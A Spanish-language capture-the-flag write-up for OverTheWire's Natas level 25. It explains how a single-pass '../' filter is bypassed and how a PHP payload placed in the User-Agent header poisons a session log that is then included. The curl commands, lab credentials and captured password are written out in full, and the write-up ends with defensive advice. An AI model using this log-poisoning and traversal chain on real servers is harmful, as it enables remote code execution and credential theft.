# Natas Level25

## Descripción
> **Level Goal (natas25.natas.labs.overthewire.org):** Una página de "idioma" incluye un archivo de plantilla según el parámetro `lang` (`safeinclude("language/" . $_REQUEST["lang"])`), con dos protecciones: (1) si detecta `"../"` en la ruta, la elimina y registra el intento en un log; (2) si detecta `"natas_webpass"` en la ruta, aborta. También registra cada intento sospechoso escribiendo la cabecera `User-Agent` del cliente, sin escapar, en un archivo de log por sesión (`logs/natas25_<session_id>.log`).

## Solución
Es una combinación de dos vulnerabilidades clásicas: **Local File Inclusion (LFI) con filtro de traversal insuficiente** + **envenenamiento de logs (log poisoning)** para lograr ejecución de código.

1. **Filtro de `../` no recursivo.** `str_replace("../", "", $filename)` se aplica **una sola vez**, no en bucle. Una cadena como `....//` contiene `"../"` como subcadena (en la posición central: `.` `.` `.` `.` `/` `/` → los caracteres 3º-5º forman `../`), así que al eliminarla una vez queda exactamente `../`, reconstruyendo la secuencia de traversal que se creía bloqueada.
2. **Log poisoning.** La función `logRequest()` escribe en el log, sin ningún escapado, el valor crudo de la cabecera `User-Agent` de la petición. Como ese log luego puede ser *incluido* como si fuera una plantilla de idioma más (usando el bypass del punto 1 para salir de `language/` y llegar a `logs/`), cualquier código PHP que pongamos en el `User-Agent` se ejecuta cuando el log se incluye.

```bash
# 1) Obtener una sesión (necesitamos su session_id para el nombre del log)
curl -s -c cookies.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo \
  http://natas25.natas.labs.overthewire.org/index.php -o /dev/null
SID=$(grep PHPSESSID cookies.jar | awk '{print $NF}')

# 2) Disparar la escritura del log con un payload PHP en el User-Agent
curl -s -b cookies.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo \
  -A '<?php passthru("cat /etc/natas_webpass/natas26"); ?>' \
  -G --data-urlencode "lang=../foo" \
  http://natas25.natas.labs.overthewire.org/index.php -o /dev/null

# 3) Incluir el log envenenado usando el bypass "....//" del filtro de traversal
curl -s -b cookies.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo \
  -G --data-urlencode "lang=....//logs/natas25_${SID}.log" \
  http://natas25.natas.labs.overthewire.org/index.php
# 3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT   (impreso por el propio PHP incluido del log)
```

## Notas adicionales
- El paso 2 necesita provocar la rama de "Directory traversal attempt!" (enviando cualquier `lang` que contenga `"../"`) para que `logRequest()` se ejecute y escriba nuestro `User-Agent` malicioso en el archivo — no basta con visitar la página normalmente.
- El nombre del archivo de log depende de `session_id()`, así que ambas peticiones (la que envenena el log y la que lo incluye) deben compartir la misma cookie `PHPSESSID`.
- Filtrar un patrón de traversal con un único `str_replace()` no recursivo es un error muy común y ampliamente documentado: siempre hay que aplicar el filtro en bucle hasta que la cadena deje de cambiar, o mejor aún, usar `realpath()` y comprobar que el resultado sigue dentro del directorio permitido, en vez de intentar "limpiar" la cadena de entrada.
- Escribir datos controlados por el atacante (headers HTTP, parámetros, etc.) en un archivo que luego puede ser interpretado como código (logs, cachés, archivos de sesión) es una fuente habitual de ejecución remota de código cuando además existe algún LFI, por pequeño que sea, que permita alcanzar ese archivo.

## Referencias
- Reto original: http://natas25.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/attacks/Path_Traversal (OWASP, Path Traversal / LFI)
- Apoyo: https://en.wikipedia.org/wiki/Log_poisoning (concepto general de log poisoning para RCE vía LFI)
